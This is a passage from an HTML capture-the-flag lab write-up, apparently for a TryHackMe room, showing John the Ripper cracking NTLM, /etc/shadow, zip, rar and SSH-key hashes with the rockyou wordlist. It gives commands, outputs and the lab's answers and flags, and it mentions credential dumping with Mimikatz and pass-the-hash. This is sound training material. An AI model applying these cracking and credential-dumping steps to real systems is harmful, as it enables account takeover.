</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>whirlpool <span style="color:#89dceb;font-weight:bold">[</span>WHIRLPOOL 32/64<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Warning: poor OpenMP scalability <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>colossal         <span style="color:#89dceb;font-weight:bold">(</span>?<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-12 12:51<span style="color:#89dceb;font-weight:bold">)</span> 6.250g/s 4300Kp/s 4300Kc/s 4300KC/s grass9..blah2007
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="cracking-windows-hashes">Cracking Windows Hashes</h4>
<p>Authentication hashes are the hashed versions of passwords that are stored by operating systems. It is sometimes possible to crack them using the brute-force methods that we&rsquo;re using. To get your hands on these hashes, you must often already be a privileged user.</p>
<h4 id="nthash--ntlm-windows-new-technology-lan-manager">NTHash / NTLM (Windows New Technology LAN Manager)</h4>
<p>NThash is the hash format that modern Windows Operating System machines will store user and service passwords. It&rsquo;s also commonly referred to as <code>NTLM</code> which references the previous version of Windows format for hashing passwords known as <code>LM</code>, thus <code>NT/LM</code></p>
<p>You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like <code>Mimikatz</code> or from the Active Directory database: <code>NTDS.dit</code>. You may not have to crack the hash to continue privilege escalation as you can often conduct a <code>pass the hash</code> attack instead.</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<h4 id="what-do-we-need-to-set-the-format-flag-to-in-order-to-crack-this">What do we need to set the &ldquo;format&rdquo; flag to, in order to crack this?</h4>






<pre tabindex="0"><code>nt</code></pre>
<br>
<h4 id="what-is-the-cracked-value-of-this-password">What is the cracked value of this password?</h4>






<pre tabindex="0"><code>mushroom</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --format<span style="color:#89dceb;font-weight:bold">=</span>nt --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt ntlm_1605054722641.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>NT <span style="color:#89dceb;font-weight:bold">[</span>MD4 128/128 ASIMD 4x2<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>mushroom         <span style="color:#89dceb;font-weight:bold">(</span>?<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-12 13:12<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..eatme1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="cracking-hashes-from-etcshadow">Cracking Hashes from <code>/etc/shadow</code></h4>
<p>The <code>/etc/shadow</code> file is the file on Linux machines where password hashes are stored. It also stores other information, such as the date of last password change and password expiration information. This file is usually only accessible by the root user.</p>
<h4 id="unshadowing">Unshadowing</h4>
<p>The basinc syntax of unshadow is as follows:</p>
<p><code>unshadow [path to passwd] [path to shadow]</code></p>
<p>example usage:</p>
<p><code>unshadow local_passwd local_shadow &gt; unshadowed.txt</code></p>
<h4 id="what-is-the-root-password">What is the root password?</h4>






<pre tabindex="0"><code>1234</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt unshadowed.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>sha512crypt, crypt<span style="color:#89dceb;font-weight:bold">(</span>3<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">$6</span>$ <span style="color:#89dceb;font-weight:bold">[</span>SHA512 128/128 ASIMD 2x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Cost <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>iteration count<span style="color:#89dceb;font-weight:bold">)</span> is <span style="color:#fab387">5000</span> <span style="color:#cba6f7">for</span> all loaded hashes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">1234</span>             <span style="color:#89dceb;font-weight:bold">(</span>root<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>1g 0:00:00:04 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-13 15:23<span style="color:#89dceb;font-weight:bold">)</span> 0.2257g/s 1849p/s 1849c/s 1849C/s 123456..whitetiger
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="single-crack-mode">Single Crack Mode</h4>
<h4 id="what-is-jokers-password">What is Joker&rsquo;s password?</h4>






<pre tabindex="0"><code>Jok3r</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<p>Make sure to modify the content of the file by prepending the username, in this case, <code>joker</code>.
<img src="image-7.png#center" alt="alt text"></p>
<br>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<h4 id="custom-rules">Custom Rules</h4>
<p>You can define your own sets of rules, which John will use to dynmaically create passwords. This is especially useful when you know more information about the password structure of whatever your target is.</p>
<p>custom rules are defined in the <code>john.conf</code> file, usually located in <code>/etc/john/john.conf</code></p>
<br>
<h4 id="what-do-custom-rules-allow-us-to-exploit">What do custom rules allow us to exploit?</h4>






<pre tabindex="0"><code>Password complexity predictability</code></pre>
<br>
<h4 id="what-rule-would-we-use-to-add-all-capital-letters-to-the-end-of-the-word">What rule would we use to add all capital letters to the end of the word?</h4>






<pre tabindex="0"><code>Az&#34;[A-Z]&#34;</code></pre>
<br>
<h4 id="what-flag-would-we-use-to-call-a-custom-rule-called-thmrules">What flag would we use to call a custom rule called &ldquo;THMRules&rdquo;</h4>






<pre tabindex="0"><code>--rule=THMRules</code></pre>
<br>
<h4 id="cracking-a-password-protected-zip-file">Cracking a Password Protected Zip File</h4>
<p>We can use John to crack the password on password protected Zip files.</p>
<p>We&rsquo;re going to be using the <code>zip2john</code> tool to convert the zip file into a hash format that John can understand and crack. Basic syntax is the following:</p>
<p><code>zip2john [options] [zip file] &gt; [output file]</code></p>
<br>
<h4 id="what-is-the-password-for-the-securezip-file">What is the password for the secure.zip file?</h4>






<pre tabindex="0"><code>pass123</code></pre>
<p><code>zip2john secure_1605054835063.zip &gt; zip_hash.txt</code></p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ zip2john secure_1605054835063.zip &gt; zip_hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ver 1.0 efh <span style="color:#fab387">5455</span> efh <span style="color:#fab387">7875</span> secure_1605054835063.zip/zippy/flag.txt PKZIP Encr: 2b chk, TS_chk, <span style="color:#f5e0dc">cmplen</span><span style="color:#89dceb;font-weight:bold">=</span>38, <span style="color:#f5e0dc">decmplen</span><span style="color:#89dceb;font-weight:bold">=</span>26, <span style="color:#f5e0dc">crc</span><span style="color:#89dceb;font-weight:bold">=</span>849AB5A6 <span style="color:#f5e0dc">ts</span><span style="color:#89dceb;font-weight:bold">=</span>B689 <span style="color:#f5e0dc">cs</span><span style="color:#89dceb;font-weight:bold">=</span>b689 <span style="color:#f5e0dc">type</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ cat zip_hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>secure_1605054835063.zip/zippy/flag.txt:<span style="color:#f5e0dc">$pkzip$1</span>*2*2*0*26*1a*849ab5a6*0*48*0*26*b689*964fa5a31f8cefe8e6b3456b578d66a08489def78128450ccf07c28dfa6c197fd148f696e3a2*$/pkzip$:zippy/flag.txt:secure_1605054835063.zip::secure_1605054835063.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ john --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt zip_hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>PKZIP <span style="color:#89dceb;font-weight:bold">[</span>32/64<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>pass123          <span style="color:#89dceb;font-weight:bold">(</span>secure_1605054835063.zip/zippy/flag.txt<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-13 16:07<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..eatme1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="what-is-the-contents-of-the-flag-inside-the-zip-file">What is the contents of the flag inside the zip file?</h4>






<pre tabindex="0"><code>THM{w3ll_d0n3_h4sh_r0y4l}</code></pre>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-password-for-the-securerar-file">What is the password for the secure.rar file?</h4>






<pre tabindex="0"><code>password</code></pre>
<p><code>rar2john secure_1605054844670.rar &gt; rar_hash.txt</code></p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</code></p>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-contents-of-the-flag-inside-the-zip-file-1">What is the contents of the flag inside the zip file?</h4>






<pre tabindex="0"><code>THM{r4r_4rch1ve5_th15_t1m3}</code></pre>
<p><code>unrar x secure_1605054844670.rar </code>, <strong>x</strong> stands for &ldquo;extract with full paths.&rdquo;</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<h4 id="cracking-ssh-keys-with-john">Cracking SSH Keys with John</h4>
<p>Unless configured otherwise, you authenticate your SSH login using a password. However, you can configure key-based authentication, which lets you use your private key, id_rsa, as an authentication key to login to a remote machine over SSH.</p>
<br>
<h4 id="ssh2john">SSH2John</h4>
<p><code>ssh2john [id_rsa private key file] &gt; [output file]</code></p>
<br>
<h4 id="what-is-the-ssh-private-key-password">What is the SSH private key password?</h4>






<pre tabindex="0"><code>mango</code></pre>
<p>First, use the <code>ssh2john</code> command to process an SSH private key file and converts it into a hash format suitable for password cracking with John the Ripper. The result will be saved to the file <code>ssh_output.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ ssh2john id_rsa_1605800988509.id_rsa &gt; ssh_output.txt</span></span></code></pre></div>
<br>
<p>This is what the output looks like after it&rsquo;s processed and converted to a hash format.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ cat ssh_output.txt                                                                                   <span style="color:#89dceb;font-weight:bold">[</span>0/21<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>id_rsa_1605800988509.id_rsa:<span style="color:#f5e0dc">$sshng$1$16$3</span>A98F468854BB3836BF689310D864CE9<span style="color:#f5e0dc">$1200$08</span>ca19b68bc606b07875701174131b9220d23ef968befc1230eeff0d7c0f904e6734765fe562e8671972e409091f32c80b754ab248976228a5f2c38e8ac63572d7452e75669aeda932275989ce4c077d43287ed227b8f9053e53f2b1c9bb9dfe876378a32e87e7be4e91a845ae8ee4073bf7ac5aad8414253c97cfb73b083107712907da8c704678f46d0b006f7a77b13a04305a988c8e17d83abd2449ed5c3defc8203d7c5f70cef3470b0bbe3fa5a2e957ac55a57ea08b1de4d3fa5436c6160a14b461ac7bc4a3052ddf858de657ecb210989507beb96f7219ac3c3790e89f3af71f7f61ebe23570284a482b1504b067fb1e03ed62201c6db71dab65e5f1577751ddb006fe14ceed4525965fce19f8141373094d1aedbb58cb903f58f6d80695be0382c31e61baaf366d4f2e722316e91ff4dcb3df15702008b5be3c0b2a81b3f452ef3257c425dd26119324b4de3652e90b91afd87ca2bc41c70abd0d97557d4037952b63c0a0d7c7ab6ed538c3d76bdf488683213e8d8e897ab51c4990b137d04e5044ccbf8cadbdce9eeec5e50f3d487b1f21e86a2b2785caedbf9503d2d8585b2138d82b35e70d1da03c9c574962cdb6e4d2de761a594ab8c082d88b43a027649012feb28b6a022c0ab49cf05e8b91e36bda935f188c1bb05925da2168dd15af917ba20a8532010892853da5cb1a8ff80cc5d3aa1dd3fe66543bf14d9b44d082261fd61976718bb5eea1d911ddb7fb0cc0505b39cec36ef7bd8e8d9d826eda5f7e1a5a51067ead2f78cf69f85de97be5a8f371174356788554b6bf134072b93bf6728ec26fe19c2485be9e7428208a66cc1e79329ac16f3034605c63550a424ed8cac39f965b6ffe83240c6709607eaef99b189100ef33e000b4195e07ec5c67bdaf2ca1acbd08327f0c4dcfae322883f7be964cb22393541e883c8c5b748237a900aab709b6286cea66a214a9fe4e3a1203f999fd995aa049767355e2658828c4a82d58ca15343f0abe6b2779e880ed2682b4730103a84a3410e6c822098d82b04d665b8bf98bc3b69cae0c8d8c9d140dc99056279d5f330bc439bfdceaf38a56fd1362ce78e96deb49a9f6756ec9b64eeba8f4725ec056ab206e37823d052d539d38016abf792858a169cbbe0f6f0d0049c6d49228833aa8ec10ede0c183ac737e54346949485e5ffc1bc3105e5686c8b1f6fb8cdb14949aa97b833757d02b970e96cb1281c472a5cb26cfa7cfda0be5bd45cf14d4bc28ccd2be4dd09c6a2ce0cf668035d2aa39a8345ea154543491436bf8f5e605d86e266d40227f48684e696a225877624ddddf0afe05d0aeec29ad28edb0f8cda0f341ddbbd454bd3c238d1c499effa6bf6f796dae0983182f36fae4781552cb8d9426fc57132c27a735c5365a5d355a4c4f21d5d7ed2ea11bb2ed856156390673545418f47359fd1092767f6dfb3321ee14a0043352fdbaa5cb0e75fde2ec5909c0533251f30bd56ad7e34a8a31b009b53c64e9f2de9fd57a0f561564e6a961158cc0b54fcfc43046d9641788ac5e25b89bdb7890c4e6532d1bfabd4d49ae7d3740506c4ecb6bc5cb6a12bc24ed2e0f913338c7dfa08ada66a6128e7de56794d1d2170d6324af0cd72bc8abcff177f0942d9df5d99d48c8f946fd856d9ccb424966835aa06c94996abcc169aef6f246bbbd7489ec026a</span></span></code></pre></div>
<br>
<p>Finally, cracking the hash with John the Ripper using the <code>rockyou</code> wordlist.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt ssh_output.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>SSH, SSH private key <span style="color:#89dceb;font-weight:bold">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Cost <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>KDF/cipher <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#f5e0dc">0</span><span style="color:#89dceb;font-weight:bold">=</span>MD5/AES <span style="color:#f5e0dc">1</span><span style="color:#89dceb;font-weight:bold">=</span>MD5/3DES <span style="color:#f5e0dc">2</span><span style="color:#89dceb;font-weight:bold">=</span>Bcrypt/AES<span style="color:#89dceb;font-weight:bold">])</span> is <span style="color:#fab387">0</span> <span style="color:#cba6f7">for</span> all loaded hashes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Cost <span style="color:#fab387">2</span> <span style="color:#89dceb;font-weight:bold">(</span>iteration count<span style="color:#89dceb;font-weight:bold">)</span> is <span style="color:#fab387">1</span> <span style="color:#cba6f7">for</span> all loaded hashes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>mango            <span style="color:#89dceb;font-weight:bold">(</span>id_rsa_1605800988509.id_rsa<span style="color:#89dceb;font-weight:bold">)</span>
